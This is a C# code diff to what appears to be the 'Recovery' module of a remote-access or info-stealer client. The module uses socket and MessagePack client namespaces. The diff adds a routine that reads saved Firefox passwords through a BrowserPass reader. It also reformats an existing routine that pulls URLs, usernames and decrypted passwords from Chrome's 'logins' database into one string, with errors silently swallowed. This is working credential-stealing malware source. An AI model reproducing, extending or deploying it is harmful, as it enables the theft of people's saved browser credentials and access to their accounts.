@@ -3,6 +3,8 @@ using System.Collections.Generic;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Windows.Forms;
+using BrowserPass;
 using Client.MessagePack;
 using Client.Sockets;
 
@@ -15,6 +17,7 @@ namespace Client.Recovery
         public void recoverAll()
         {
             recoverChrome();
+            recoverFirefox();
         }
 
         public Recovery()
@@ -186,7 +189,7 @@ CharSet = System.Runtime.InteropServices.CharSet.Auto)
                             sql.ReadTable("logins");
                         }
                         catch { }
-
+                        Pass += "== Chrome ==========\n";
                         for (int i = 0; i <= sql.GetRowCount() - 1; i++)
                         {
                             string url = sql.GetValue(i, "origin_url");
@@ -204,7 +207,7 @@ CharSet = System.Runtime.InteropServices.CharSet.Auto)
 
                             // Format like this:
                             // Type \n URL \n User \n Pass \n\n
-                            Pass += "Chrome\n" + url + "\n" + username + "\n" + password + "\n\n";
+                            Pass += url + "\nU: " + username + "\nP: " + password + "\n\n";
                         }
                     }
                     catch (Exception eax)
@@ -214,6 +217,24 @@ CharSet = System.Runtime.InteropServices.CharSet.Auto)
                 }
             }
             catch { }
+        }
+        public void recoverFirefox()
+        {
+            try
+            {
+                List<IPassReader> readers = new List<IPassReader>();
+                readers.Add(new FirefoxPassReader());
+                foreach (var reader in readers)
+                {
+                    Pass += "\n== Firefox ==========\n";
+                    foreach (var d in reader.ReadPasswords())
+                    {
+                        Pass += d.Url + "\nU: " + d.Username + "\nP: " + d.Password + "\n\n";
+                    }
+
+                }
+            }
+            catch { };
         }
     }
 }
